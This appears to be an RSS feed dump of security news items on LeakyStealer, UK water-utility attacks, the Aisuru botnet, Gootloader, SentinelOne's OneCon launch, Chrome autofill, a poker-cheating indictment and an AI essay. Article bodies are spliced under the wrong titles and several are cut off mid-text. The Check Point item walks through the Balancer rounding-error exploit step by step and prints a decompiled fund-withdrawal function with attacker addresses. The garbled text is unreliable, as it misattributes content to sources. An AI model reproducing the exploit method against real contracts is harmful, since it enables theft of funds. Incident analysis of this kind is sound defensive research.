(EV) certificate may have been potentially obtained through fraudulent means or a compromised business entity may have potentially been abused for malware signing. The seven samples share consistent operational patterns:Persistence mechanisms across all variantsMasquerading as legitimate Microsoft Edge update componentsRecent activity with samples spanning October 1-9, 2025 A Shodan search for the IP address returns open ports 22, 80 and 443.Figure 34 - Shodan searchThere are two domains associated with the IP address, namely “” and “”.  Figure 35 - Shodan result for the IP addressThe MSI file called “” drops LeakyStealer with SHA256  that communicates with the same C2 server.

For example, it highlights that the process targets crypto browser extensions and the history files across multiple browsers. Through in-depth technical analysis of LeakyStealer’s core functionality, we’re potentially offering insights enabling more effective detection and defense strategies.Hybrid Analysis is a powerful platform for identifying and analyzing malware, whether mundane or highly sophisticated.

As set forth in the indictment, the rigged games used altered shuffling machines that contained hidden technology allowing the machines to read all the cards in the deck.  Because the cards were always dealt in a particular order to the players at the table, the machines could determine which player would have the winning hand. This information was transmitted to an off-site member of the conspiracy, who then transmitted that information via cellphone back to a member of the conspiracy who was playing at the table, referred to as the “Quarterback” or “Driver.”  The Quarterback then secretly signaled this information (usually by prearranged signals like touching certain chips or other items on the table) to other co-conspirators playing at the table, who were also participants in the scheme.  Collectively, the Quarterback and other players in on the scheme (i.e., the cheating team) used this information to win poker games against unwitting victims, who sometimes lost tens or hundreds of thousands of dollars at a time. The defendants used other cheating technology as well, such as a chip tray analyzer (essentially, a poker chip tray that also secretly read all cards using hidden cameras), an x-ray table that could read cards face down on the table, and special contact lenses or eyeglasses that could read pre-marked cards. ]]></content:encoded></item><item><title>From Tabletop to Turnkey: Building Cyber Resilience in Financial Services</title><link>https://thehackernews.com/2025/11/from-tabletop-to-turnkey-building-cyber.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgiaJEM1FidoLhzNIrYBATCN7L9TeVdHj9VIprFLqsgTxUHm_iQChfyBlaCMZmoGonBSd1lHzUuVLOOY-tp25Ys8SdCPz_D86hBTHEOv_7LQijqkKpwRUr7AzQSlhL8KjqlKKZ1eYH-UBv6sAVfyFtyjisLixySCxpFvnHGJ6XaqWtc1EnB4_NkbnBxqTT5/s1600/lock.jpg" length="" type=""/><pubDate>Thu, 6 Nov 2025 11:59:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Introduction

Using freedom of information laws, the site discovered five incidents that had taken place since January 1, 2024.A steady stream of water attacksThese aren’t the first attacks on UK water systems. In August 2022, the Clop ransomware gang hit South Staffordshire Water, thinking that it was actually Thames Water. The attack focused on stealing customer data, meaning water supplies weren’t disrupted, although corporate systems were affected.In late 2023, pro-Iranian hackers disrupted water supplies in County Mayo, Ireland. The intruders, known as the Cyber Av2ngers group, caused outages across 160 homes for two days. The attack was politically motivated by the utility’s apparent use of an Israeli-made tool.These are far from the only attacks on water systems around the world. In February last year, CISA warned that a Chinese state-sponsored group had spent nine months moving laterally through a US water facility.In that incident, attackers gained access using an administrator’s login and spent months inside the infrastructure, nosing around databases and other assets. CISA linked the intrusion to Volt Typhoon—a group that also targeted telecommunications companies around the world. The attackers were described as “OT adjacent,” meaning they had reached administrative systems close enough to potentially impact the operational technology that controls water flow.The attacks keep coming. Just last month, the Canadian Centre for Cybersecurity reported an attack on a municipal water facility. Hacktivists managed to alter water pressure, causing “degraded service” for the local community.It’s always worrying when attackers target critical national infrastructure. When attackers hit Colonial Pipeline in 2021, they only compromised its administrative network (the part that handles paperwork). But the company was spooked enough that it shut down its fuel distribution systems too, as a protective measure, causing gasoline prices to spike across the US East Coast.A possible legal shake-upMany attacks on water systems might go unreported, depending on where they happen. The UK’s Network and Information Systems (NIS) regulations dictate that critical national infrastructure organizations should reveal cyber attacks to the public. However, that only applies if those attacks caused disruption.That’s why the attacks uncovered by Recorded Future haven’t been made public until now. While worrying, they didn’t affect the UK’s water supply. A 2022 review of the NIS regulations criticized this limited disclosure, noting that attacks with the potential to disrupt services often went unreported.Although the attacks reported to Recorded Future were voluntarily disclosed by the DWI by suppliers, upcoming legal changes could lower the bar for mandatory reporting. The UK’s proposed Cyber Security and Resilience Bill would expand disclosure requirements, increasing transparency about attacks that could affect the water supply. The Bill is expected to reach Parliament in 2025—though time is running short.A resource under pressureWater is under considerable threat already in the UK, with major droughts declared this year. The Met Office reports that this year’s February-to-April period was the driest since 1956, with rainfall at just half the long-term average. River flows have dropped sharply, soil moisture is down, and the National Drought Group has met to coordinate a national response.Water companies already have plans to manage shortages, the UK government says. But as the cyberattacks mount, the question is: are their system defenses strong enough too?We don’t just report on threats—we remove them]]></content:encoded></item><item><title>Sandworm hackers use data wipers to disrupt Ukraine&apos;s grain sector</title><link>https://www.bleepingcomputer.com/news/security/sandworm-hackers-use-data-wipers-to-disrupt-ukraines-grain-sector/</link><author>Bill Toulas</author><category>security</category><pubDate>Thu, 6 Nov 2025 10:01:28 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Russian state-backed hacker group Sandworm has deployed multiple data-wiping malware families in attacks targeting Ukraine's education, government, and the grain sector, the country's main revenue source.

Cloudflare responded by redacting Aisuru domain names from their top websites list. The chief executive at Cloudflare says Aisuru’s overlords are using the botnet to boost their malicious domain rankings, while simultaneously attacking the company’s domain name system (DNS) service.The #1 and #3 positions in this chart are Aisuru botnet controllers with their full domain names redacted. Source: radar.cloudflare.com.Until recently, Aisuru’s malicious code instructed all infected systems to use DNS servers from Google — specifically, the servers at 8.8.8.8. But in early October, Aisuru switched to invoking Cloudflare’s main DNS server — 1.1.1.1 — and over the past week domains used by Aisuru to control infected systems started populating Cloudflare’s top domain rankings.As screenshots of Aisuru domains claiming two of the Top 10 positions ping-ponged across social media, many feared this was yet another sign that an already untamable botnet was running completely amok. One Aisuru botnet domain that sat prominently for days at #1 on the list was someone’s street address in Massachusetts followed by “.com”. Other Aisuru domains mimicked those belonging to major cloud providers.Cloudflare tried to address these security, brand confusion and privacy concerns by partially redacting the malicious domains, and adding a warning at the top of its rankings:“Note that the top 100 domains and trending domains lists include domains with organic activity as well as domains with emerging malicious behavior.”Cloudflare CEO  told KrebsOnSecurity the company’s domain ranking system is fairly simplistic, and that it merely measures the volume of DNS queries to 1.1.1.1.“The attacker is just generating a ton of requests, maybe to influence the ranking but also to attack our DNS service,” Prince said, adding that Cloudflare has heard reports of other large public DNS services seeing similar uptick in attacks. “We’re fixing the ranking to make it smarter. And, in the meantime, redacting any sites we classify as malware.”, vice president of threat intel at the DNS security firm , said many people erroneously assumed that the skewed Cloudflare domain rankings meant there were more bot-infected devices than there were regular devices querying sites like Google and Apple and Microsoft.“Cloudflare’s documentation is clear — they know that when it comes to ranking domains you have to make choices on how to normalize things,” Burton wrote on . “There are many aspects that are simply out of your control. Why is it hard? Because reasons. TTL values, caching, prefetching, architecture, load balancing. Things that have shared control between the domain owner and everything in between.” is CEO of the anti-phishing and security firm . Greenland said he understands the technical reason why Aisuru botnet domains are showing up in Cloudflare’s rankings (those rankings are based on DNS query volume, not actual web visits). But he said they’re still not meant to be there.“It’s a failure on Cloudflare’s part, and reveals a compromise of the trust and integrity of their rankings,” he said.Greenland said Cloudflare planned for its Domain Rankings to list the most popular domains as used by human users, and it was never meant to be a raw calculation of query frequency or traffic volume going through their 1.1.1.1 DNS resolver.“They spelled out how their popularity algorithm is designed to reflect real human use and exclude automated traffic (they said they’re good at this),” Greenland wrote on LinkedIn. “So something has evidently gone wrong internally. We should have two rankings: one representing trust and real human use, and another derived from raw DNS volume.”Why might it be a good idea to wholly separate malicious domains from the list? Greenland notes that Cloudflare Domain Rankings see widespread use for trust and safety determination, by browsers, DNS resolvers, safe browsing APIs and things like TRANCO.“TRANCO is a respected open source list of the top million domains, and Cloudflare Radar is one of their five data providers,” he continued. “So there can be serious knock-on effects when a malicious domain features in Cloudflare’s top 10/100/1000/million. To many people and systems, the top 10 and 100 are naively considered safe and trusted, even though algorithmically-defined top-N lists will always be somewhat crude.”Over this past week, Cloudflare started redacting portions of the malicious Aisuru domains from its Top Domains list, leaving only their domain suffix visible. Sometime in the past 24 hours, Cloudflare appears to have begun hiding the malicious Aisuru domains entirely from the web version of that list. However, downloading a spreadsheet of the current Top 200 domains from Cloudflare Radar shows an Aisuru domain still at the very top.According to Cloudflare’s website, the majority of DNS queries to the top Aisuru domains — nearly 52 percent — originated from the United States. This tracks with my reporting from early October, which found Aisuru was drawing most of its firepower from IoT devices hosted on U.S. Internet providers like ,  and .Experts tracking Aisuru say the botnet relies on well more than a hundred control servers, and that for the moment at least most of those domains are registered in the .su top-level domain (TLD). Dot-su is the TLD assigned to the former Soviet Union (.su’s Wikipedia page says the TLD was created just 15 months before the fall of the Berlin wall).A Cloudflare blog post from October 27 found that .su had the highest “DNS magnitude” of any TLD, referring to a metric estimating the popularity of a TLD based on the number of unique networks querying Cloudflare’s 1.1.1.1 resolver. The report concluded that the top .su hostnames were associated with a popular online world-building game, and that more than half of the queries for that TLD came from the United States, Brazil and Germany [it’s worth noting that servers for the world-building game  were some of Aisuru’s most frequent targets].A simple and crude way to detect Aisuru bot activity on a network may be to set an alert on any systems attempting to contact domains ending in .su. This TLD is frequently abused for cybercrime and by cybercrime forums and services, and blocking access to it entirely is unlikely to raise any legitimate complaints.]]></content:encoded></item><item><title>ISC Stormcast For Thursday, November 6th, 2025 https://isc.sans.edu/podcastdetail/9688, (Thu, Nov 6th)</title><link>https://isc.sans.edu/diary/rss/32456</link><author></author><category>threatintel</category><pubDate>Thu, 6 Nov 2025 02:00:02 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Gootloader malware is back with new tricks after 7-month break</title><link>https://www.bleepingcomputer.com/news/security/gootloader-malware-is-back-with-new-tricks-after-7-month-break/</link><author>Lawrence Abrams</author><category>security</category><pubDate>Wed, 5 Nov 2025 21:52:45 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[The Gootloader malware loader operation has returned after a 7-month absence and is once again performing SEO poisoning to promote fake websites that distribute the malware.

Cloud gave us scale. AI is giving us cognition – systems that can reason, decide, and act.Firewalls helped the internet era. Workload protection helped the cloud era. And, in the AI era, you have AI Security.This is a new field and frontier that requires mastering two disciplines at once. – Governing and protecting the usage of AI itself. Models, data, agents, and the users and developers who rely on them. In many cases, this is also done by AI. – Applying agentic AI and machine learning to solve today’s biggest cybersecurity challenge: Staying ahead of AI-powered attacks by detecting, investigating, and responding at machine speed.Most importantly, in this era, the architecture and infrastructure needed to truly benefit from AI will be the determining factor to successfully secure it. Quality of data, inclusivity of data, cardinality, and latency will be critical, as will be the tools and technologies facilitating those.At OneCon 2025, we are laying out a practical path to secure this new world. The opportunities AI creates, the risks it introduces. The strategy and product innovation you can put to work today to accelerate and de-risk your AI journey.AI: Business Accelerant & New Attack SurfaceThe need for these dual disciplines is driven by the rapid increase in AI usage itself – both by good and bad forces.AI is accelerating everything. It is transforming how businesses operate, how employees work, and how attackers adapt. Across every single industry, AI is becoming embedded into processes, tools and workflows in every team. Marketing teams use it to generate content. Developers use it to write code. Legal, HR and finance all use it to summarize and automate tasks. AI is now woven into the very fabric of how organizations think and operate.While holding incredible potential benefits, this transformation is also introducing massive new security risks. Traditional security controls are blind to the data that employees are entering into 3rd-party AI models. Security teams lack visibility into the growing ecosystem of AI tools and assistants spreading across every single enterprise. AI-based browsers that integrate chat or summarization features create new pathways for data exposure. And the rise of Model Context Protocol (MCP) servers that connect agents to agents introduces an entirely new layer of risk that most organizations are not equipped to monitor or govern today.Meanwhile, adversaries are evolving just as quickly. They are using AI to increase efficiency, precision, and their reach. Non-native English speakers can now craft a convincing, localized spearphishing campaign in minutes. LLMs are being used to write polymorphic malware that mutates faster than traditional defenses can react. Attackers are automating their reconnaissance, identifying vulnerabilities through natural language interfaces, and even embedding AI models directly inside malware to adapt in real time.The result is a security gap that spans both sides of the equation – on one side, AI as a catalyst for real business innovation and, on the other, AI as an enabler of attack and massive risk exposure.Building Security in the Age of AI: Three Critical PrinciplesProtecting this new world requires visibility, intelligent automation, and governance that can move at the same speed as AI itself. In solving for that, we believe in a simple yet critical guiding philosophy to delivering effective AI Security – three critical principles that inform everything that we build and anchor any platform-level defense. – Security must think, not react. Static signatures and brittle logic can’t match the velocity of modern threats. True protection emerges when AI continuously learns, reasons, and adapts — detecting intent, not just pattern. – Machines should act at machine speed, but always within human-defined guardrails and system supervision. The future of defense is autonomous, but never ungoverned where AI decisions remain explainable, traceable, and aligned with human values. – Effective AI security fuses signals from endpoints, identities, and clouds into one coherent understanding. Insight without context is noise; action without context is chaos. The synthesis of both creates real-time, end-to-end resilience.These principles map directly to the questions customers ask us every day.How do I better defend my organization?How do I outpace threats?How do I get the most from my people and partners?SentinelOne’s AI AdvantageWhen it comes to making AI Security real today, SentinelOne is in a unique position. We have been AI-native since day one. Automation has been foundational from the start, not a bolt-on. And, we’ve been using agentic approaches and workflows in live security environments before it became the buzzword du jour.At launch, we were among the first to apply machine learning to malware detection and prevention. That broke the decades-old pattern of pushing static signatures to endpoints many times a day. Instead of distributing new rules after every outbreak, we trained lightweight predictive models that identified malicious behavior on their own. That meant detecting never-before-seen threats in real time at massive scale.That innovation reshaped endpoint security and set the foundation for what followed. The same principles of data-driven models, autonomous decision making, and behavioral analytics evolved into the Singularity Platform and now power Purple AI, our agentic system that changes how analysts detect, investigate, and respond. Together, they extend protection and intelligence across endpoint, identity, cloud, and AI. It is an entire platform built on and enhanced by AI. This is how we keep our customers safe: By delivering real time security that is predictive and adaptive, at planet scale.This year we took the next step with two focused acquisitions: – A portfolio built to secure AI use cases and protect how employees, developers, and applications leverage generative and agentic AI. This is a critical component of protecting AI as an attack surface itself. – An AI-ready streaming data pipeline that intelligently filters, normalizes, and ingests petabytes of telemetry across the enterprise with sub-second latency and strong cost efficiency. Combined with Singularity AI SIEM, this provides both pre-ingestion analytics and flexible pull/stream data collection, ensuring complete visibility, real-time detections and autonomous response across the entire security environment.These advancements extend Singularity into a unified AI Security architecture that gives defenders a complete, autonomous view across traditional and emerging surfaces – from premise to cloud.Delivering on the AI Security Vision TodayToday at OneCon, we’re not just giving customers a roadmap and strategy, we’re giving them new tools and innovation to start securing their AI-enterprise today, including: – Real-time visibility and policy enforcement across thousands of AI tools. Shadow AI discovery, data loss prevention for prompts and outputs, safe coding with secret redaction and vulnerable code blocking, and protection for internal AI applications. – Integrated agentic auto-investigations with dynamic runbooks. Next best actions on alerts. One-click custom detection rule creation that turns investigation outcomes into durable detections. Integration with Singularity Hyperautomation for approved response. – A secure bridge between Singularity’s live intelligence and your AI ecosystem. Build your own agents grounded in your security context. Use OpenAI, Anthropic, Gemini, or internal models. Innovate securely at scale. The MCP Server is open source and available on GitHub today. – Vendor-agnostic data engine for any source to any destination. When paired with Singularity AI SIEM, Observo supercharges detection and response with high-fidelity, cost-efficient streaming telemetry. – Global insight combined with automation and human expertise. GTI visibility feeds directly into SentinelOne services. Intelligence becomes action through Purple and our analysts. Faster, more precise response as a matter of process, not hope.Native scalability to million+ active agents in a single deployment. Faster policy updates with minute command SLA.Agent efficiency improvements across operating systems. Lower CPU and memory usage, fewer support cases, better user experience.AI SIEM query engine overhaul that supports very high cardinality and keeps up to seven years of security data hot. Natural language search in Purple AI operates on the same high performance data. No cold storage delays.Live Security Updates upgrades that dramatically reduce response times, and improve accuracy and efficacy.  And more customer controls for safe rollout.Thousands of new detections continually delivered, from the AI-SIEM to the endpoint agent. We’re wherever the adversary moves, delivering real-time protection across dozens of surfaces and data sources. With AI infused into every layer of our operations, we’re moving faster, scaling further, and stopping even unknown threats with greater precision than ever before.New Infrastructure as Code (IaC) deployment processes, better observability across the platform, and proactive communications on incidents via a public status page have all been added to bolster resilience, reliability and transparency.Active monitoring mode and proactive alerting extends resilience outside the SaaS operation into the Endpoint agent, providing near real-time health metrics of the agents themselves – now transparently available for the customer visibility in the agent management control plane.The Path Forward in AI Security: Advancing Humanity, Protecting the HumanAI security is more than just defending systems, it’s about defending the fabric of trust that lets humans thrive in a digital world. As intelligence becomes ambient and autonomous, security must evolve from a reactive layer into an enabling force for human progress. – By offloading complexity and noise to intelligent machines, AI security frees humans to focus on creativity, empathy, and purpose. Protection becomes invisible, a silent force amplifying human capability rather than constraining it. – As data becomes identity, securing truth is a moral imperative. AI security safeguards the authenticity of information, ensuring societies can rely on what they see, share, and believe. As our lives move fully into digital spaces, the boundary between human and machine expression blurs. Every action carries traces of who we are. In this new reality, AI Security’s role is to safeguard that trust: To ensure that what we see, share, and decide upon is authentic. It means protecting the fidelity of data, the truth of identities, and the integrity of digital interactions against manipulation. It is the contract to our reality. – The next era demands systems that defend not only themselves, but the people they serve. Ethical AI security means designing intelligence that understands context, respects privacy, and acts in humanity’s best interest even when no one is watching.Ultimately, the path forward fuses human and artificial intelligence into a shared defense, machines protecting people, and people guiding machines, so that technology remains our most trusted ally, not our greatest risk.Defenders deserve a technology that protects every surface, that can see everything, turns data into advantage, and puts human governance at the center. So, let’s get started.AI for Security. Security for AI. Autonomous protection, always evolving, in production, today, all in pursuit of a safer, brighter future.]]></content:encoded></item><item><title>AI Security Realized: Innovation Highlights from OneCon25</title><link>https://www.sentinelone.com/blog/ai-security-realized-innovation-highlights-from-onecon25/</link><author>SentinelOne</author><category>threatintel</category><enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/11/OneCon25_Blog_1200x627.png" length="" type=""/><pubDate>Wed, 5 Nov 2025 14:00:15 +0000</pubDate><source url="https://www.sentinelone.com/">SentinelOne Blog</source><content:encoded><![CDATA[Today, on the main stage at OneCon 2025, SentinelOne is taking the wraps off its vision, roadmap, and new portfolio for securing an AI-powered world.

The new “enhanced autofill” can now stash your driver’s license, passport details, VIN, or license plate information. Sounds convenient, right? But just because you can, it doesn’t mean you should.Let’s face it: filling out government forms or travel bookings online is a pain. Anything that saves a few minutes—or spares you from hunting down your passport at the back of a drawer—feels like a win, especially if Chrome can neatly autofill those fields. And yes, Google promises encryption, explicit permission for autofill, and manual activation only if you want it.But let’s think this through. Is storing your most personally identifiable information—like government-issued IDs—in the market-dominant browser a good idea? Because that’s what Chrome is.Chrome’s market share (over 73% at the time of writing) makes it the internet’s biggest bullseye for criminals. Whether you’re using the enhanced autofill or the regular one, browser-based storage schemes are relentlessly hunted by password stealers, infostealers, and other types of malware.And let’s not forget phishing attempts. Maybe having to dig through your drawer while you think about why a website needs that information isn’t such a bad thing after all.Sure, Chrome encrypts autofill data, only saves your info with permission, and asks for confirmation before pasting it into a form. You can also ramp up security with two-factor authentication (2FA) and a Chrome sync passphrase. But when cybercriminals get the right kind of access (by stealing a browser session, finding an unlocked device, or getting you to install a rogue extension), your sensitive information is in danger. And with what Chrome can now store, that could mean your identity.Chrome’s enhanced autofill promises a smoother online ride, but the consequences of storing government IDs in your browser could outweigh the perks. Cybercriminals love a big target—and with Chrome’s popularity, the bounty only grows. When the reward for a criminal is your passport, driver’s license, or identity, convenience should come second to caution.Thankfully, someone decided it was a good idea to turn off this feature by default, but if you want to check, here’s how to find it:In the main Chrome menu, click on .Under , select  if present.Better alternative: password managersWe would advise that if you must store this kind of information digitally, use a password manager. These tools are built for secure storage—they’re audited for security, separate from browser processes, and don’t automatically serve up your data to any site that happens to have the right input fields.Stick to a dedicated password manager and stay in control of what’s stored and where it gets filled out.

On November 3, 2025, Check Point Research’s blockchain monitoring systems detected a sophisticated exploit targeting Balancer V2’s ComposableStablePool contracts. The attacker exploited arithmetic precision loss in pool invariant calculations to drain **$128.64 million** across six blockchain networks in under 30 minutes.

The attack leveraged a rounding error vulnerability in the \_upscaleArray function that, when combined with carefully crafted batchSwap operations, allowed the attacker to artificially suppress BPT (Balancer Pool Token) prices and extract value through repeated arbitrage cycles. The exploitation occurred primarily during attacker smart contract deployment, with the constructor executing 65+ micro-swaps that compounded precision loss to devastating effect.

In the early morning hours of November 3, 2025, Check Point’s Blockchain Threat Analysis system flagged unusual activity on the Ethereum mainnet involving Balancer’s V2 Vault contract. Within minutes, our automated detection identified a critical exploit in progress, with massive fund outflows from multiple liquidity pools.

The attack exploited a mathematical vulnerability in how Balancer’s ComposableStablePools handle small-value swaps. When token balances are pushed to specific rounding boundaries (8-9 wei range), Solidity’s integer division causes significant precision loss. The attacker weaponized this by executing batched swap sequences that accumulated these tiny errors into catastrophic invariant manipulation.

Balancer V2 uses a centralized “Vault” contract (0xBA12222222228d8Ba445958a75a0704d566BF2C8) that holds all tokens across all pools, separating token storage from pool logic to reduce gas costs and enable capital efficiency. This shared liquidity design meant a single vulnerability in pool math could affect all ComposableStablePools simultaneously—exactly what happened in this attack.

Balancer V2’s Internal Balance system allows users to deposit tokens once and use them across multiple operations without repeated ERC20 transfers:

```
mapping(address => mapping(IERC20 => uint256)) private _internalTokenBalance;
```

This system became critical to the attack. The exploit contract accumulated stolen funds in its internal balance during deployment, then withdrew them to the final recipient address in subsequent transactions.

ComposableStablePools use Curve’s StableSwap invariant formula to maintain price stability between similar assets. The invariant D represents total pool value, and BPT price is calculated as D divided by totalSupply. However, the scaling operations that prepare balances for invariant calculations introduce rounding errors.

```
function _upscaleArray(uint256[] memory amounts, uint256[] memory scalingFactors) private pure returns (uint256[] memory) { for (uint256 i = 0; i < amounts.length; i++) { amounts[i] = FixedPoint.mulDown(amounts[i], scalingFactors[i]); } return amounts; } // Simplified representation - actual implementation is more complex function _calculateInvariant(uint256[] memory balances) private pure returns (uint256) { uint256[] memory scaledBalances = _upscaleArray(balances, scalingFactors); uint256 invariant = computeStableInvariant(scaledBalances, amplificationParameter); return invariant; }
```

The mulDown function performs integer division that rounds down. When balances are small (8-9 wei range), this rounding creates significant relative errors—up to 10% precision loss per operation.

This precision error propagates to the invariant D calculation, causing abnormal reduction in the calculated value. Since BPT price equals D divided by total supply, the reduced D directly lowers BPT price, creating arbitrage opportunities for the attacker.

Individual swaps produce negligible precision loss, but within a single batchSwap transaction containing 65 operations, these losses compound dramatically. The lack of invariant change validation allowed the attacker to systematically suppress BPT price through accumulated precision errors, extracting millions in value per pool

The attacker executed a sophisticated three-stage swap sequence within single \`batchSwap\` transactions:

**Stage 1: Adjustment to Rounding Boundary**

Swap large amounts of BPT for underlying tokens to push one token’s balance to the critical 8-9 wei threshold where rounding errors are maximized.

**Stage 2: Trigger Precision Loss**

Execute small swaps involving the boundary-positioned token. The `_upscaleArray` function rounds down during scaling, causing the invariant D to be underestimated and BPT price to drop artificially.

**Stage 3: Extract Value**

Mint or purchase BPT at the suppressed price, then immediately redeem for underlying assets at full value. The price discrepancy represents pure profit.

**This three-phase cycle repeated 65 times within the same** **batchSwap** **transaction.** All stages occur atomically, preventing intervention and ensuring precision losses accumulate across the shared balance state, ultimately extracting millions from each targeted pool.

Having understood the vulnerability mechanism, let’s examine how the attacker automated this exploitation.

**Exploit Contract Architecture**

The attacker deployed contract \`0x54B53503c0e2173Df29f8da735fBd45Ee8aBa30d\` with a three-address operational structure:

– Exploiter 1: 0x506D1f9EFe24f0d47853aDca907EB8d89AE03207 (deployer)

– Exploit Contract: 0x54B53503c0e2173Df29f8da735fBd45Ee8aBa30d

– Exploiter 2: 0xAa760D53541d8390074c61DEFeaba314675b8e3f (recipient)

**Constructor-Based Attack**

Analysis of transaction 0x6ed07db… revealed the theft occurred during contract deployment. The constructor automatically executed the rounding error exploitation, targeting two Balancer pools simultaneously.

The constructor generated 65 token transfers to Balancer’s Protocol Fees Collector—these are swap fees collected during the manipulation, not the stolen funds themselves. The transfer amounts display the characteristic pattern of iterative precision exploitation, decreasing from 0.414 osETH down to 0.000000000000000003 osETH as the rounding errors compound to negligible values.

The stolen value appears in InternalBalanceChanged events, which record balance updates within the Vault’s internal accounting system. The exploit contract’s internal balance increased by:

Pool 1 (osETH/wETH-BPT): +4,623 WETH, +6,851 osETH

Pool 2 (wstETH-WETH-BPT): +1,963 WETH, +4,259 wstETH **Combined total: 6,586 WETH (4,623 + 1,963) + 6,851 osETH + 4,259 wstETH**

These internal balance increases represent the actual stolen funds. The `InternalBalanceChanged` events show that the exploit contract’s Vault-internal account was credited with the drained assets. While the underlying tokens physically remained in the Vault contract, the Vault’s accounting system now recognized the exploit contract as the owner of these balances, enabling later withdrawal.

After the constructor accumulated stolen funds, function 0x8a4f75d6 transferred them to Exploiter 2:

```
function 0x8a4f75d6(address[] calldata targetPools) public { require(msg.sender == _callTx); poolIndex = 0; while (poolIndex < targetPools.length) { poolId = targetPools[poolIndex].getPoolId(); (tokens[],) = vault.getPoolTokens(poolId); internalBals[] = vault.getInternalBalance(address(this), tokens); tokenIndex = 0; while (tokenIndex < tokens.length) { operations[tokenIndex] = UserBalanceOp({ kind: 1, asset: tokens[tokenIndex], amount: internalBals[tokenIndex], sender: address(this), recipient: 0xAa760D53541d8390074c61DEFeaba314675b8e3f }); tokenIndex++; } vault.manageUserBalance(operations); poolIndex++; } }
```

This function withdraws the contract’s own internal balance. The UserBalanceOp has sender equal to the exploit contract address because the contract legitimately owns the funds accumulated during constructor execution.

Transaction \`0xd155207…\` confirms this withdrawal transferred 6,586 WETH from the exploit contract’s internal balance to Exploiter 2 address.

**Stage 1 – Theft (Constructor Execution):**

TX: 0x6ed07db1a9fe5c0794d44cd36081d6a6df103fab868cdd75d581e3bd23bc9742

Action: Deploy exploit contract

Method: Constructor executes batchSwap operations against two pools

Result: $63M drained via rounding error, stored in contract’s internal balance

Evidence: 65 fee transfers + InternalBalanceChanged events showing +6,586 WETH, +6,851 osETH, +4,259 wstETH

**Stage 2 – Extraction (Function Call):**

TX: 0xd155207261712c35fa3d472ed1e51bfcd816e616dd4f517fa5959836f5b48569

Action: Call function 0x8a4f75d6

Method: Withdraw internal balance to Exploiter 2

Result: Funds transferred to final recipient

Evidence: manageUserBalance with sender = exploit contract

The Balancer exploit demonstrates how mathematical vulnerabilities in DeFi protocols can be weaponized through automation and careful parameter tuning. The attacker’s success stemmed from recognizing that negligible rounding errors become exploitable when amplified through dozens of operations in atomic transactions.

Despite extensive audits, the vulnerability persisted because traditional testing focuses on individual operation correctness, not cumulative effects of adversarial batch operations. The industry must evolve toward continuous security validation, economic attack modeling, and adversarial testing that considers how tiny flaws compound into catastrophic exploits.]]></content:encoded></item><item><title>How an Attacker Drained $128M from Balancer Through Rounding Error Exploitation</title><link>https://research.checkpoint.com/2025/how-an-attacker-drained-128m-from-balancer-through-rounding-error-exploitation/</link><author>matthewsu</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 12:04:59 +0000</pubDate><source url="https://research.checkpoint.com/">Check Point Research</source><content:encoded><![CDATA[By: Dikla Barda, Roaman Zaikin & Oded Vanunu On November 3, 2025, Check Point Research’s blockchain monitoring systems detected a sophisticated exploit targeting Balancer V2’s ComposableStablePool contracts.

AI is making warfare more precise and deadly amidst intransigent conflicts. AI companies are exploiting people in the global South who work as data labelers, and profiting from content creators worldwide by using their work without license or compensation. The industry is also affecting an already-roiling climate with its enormous energy demands.Meanwhile, particularly in the United States, public investment in science seems to be redirected and concentrated on AI at the expense of other disciplines. And Big Tech companies are consolidating their control over the AI ecosystem. In these ways and others, AI seems to be making everything worse.This is not the whole story. We should not resign ourselves to AI being harmful to humanity. None of us should accept this as inevitable, especially those in a position to influence science, government, and society. Scientists and engineers can push AI towards a beneficial path. Here’s how.A Pew study in April found that 56 percent of AI experts (authors and presenters of AI-related conference papers) predict that AI will have positive effects on society. But that optimism doesn’t extend to the scientific community at large. A 2023 survey of 232 scientists by the Center for Science, Technology and Environmental Policy Studies at Arizona State University found more concern than excitement about the use of generative AI in daily life—by nearly a three to one ratio.We have encountered this sentiment repeatedly. Our careers of diverse applied work have brought us in contact with many research communities: privacy, cybersecurity, physical sciences, drug discovery, public health, public interest technology, and democratic innovation. In all of these fields, we’ve found strong negative sentiment about the impacts of AI. The feeling is so palpable that we’ve often been asked to represent the voice of the AI optimist, even though we spend most of our time writing about the need to reform the structures of AI development.We understand why these audiences see AI as a destructive force, but this negativity engenders a different concern: that those with the potential to guide the development of AI and steer its influence on society will view it as a lost cause and sit out that process.Elements of a Positive Vision for AIManyhavearguedthatturning the tide of climate action requires clearly articulating a path towards positive outcomes. In the same way, while scientists and technologists should anticipate, warn against, and help mitigate the potential harms of AI, they should also highlight the ways the technology can be harnessed for good, galvanizing public action towards those ends.There are myriad ways to leverage and reshape AI to improve peoples’ lives, distribute rather than concentrate power, and even strengthen democratic processes. Many examples have arisen from the scientific community and deserve to be celebrated.While each of these applications is nascent and surely imperfect, they all demonstrate that AI can be wielded to advance the public interest. Scientists should embrace, champion, and expand on such efforts.A Call to Action for ScientistsThese apply to scientists as well. Researchers should work to  the AI industry to be more ethical, equitable, and trustworthy. We must collectively developethicalnorms for research that advance and applies AI, and should use and draw attention to AI developers who adhere to those norms.Second, we should  harmful uses of AI by documenting the negative applications of AI and casting a light on inappropriate uses.Third, we should  AI to make society and peoples’ lives better, exploiting its capabilities to help the communities they serve.And finally, we must advocate for the  of institutions to prepare them for the impacts of AI; universities, professional societies, and democratic organizations are all vulnerable to disruption.Scientists have a special privilege and responsibility: We are close to the technology itself and therefore well positioned to influence its trajectory. We must work to create an AI-infused world that we want to live in. Technology, as the historian Melvin Kranzberg observed, “is neither good nor bad; nor is it neutral.” Whether the AI we build is detrimental or beneficial to society depends on the choices we make today. But we cannot create a positive future without a vision of what it looks like.This essay was written with Nathan E.

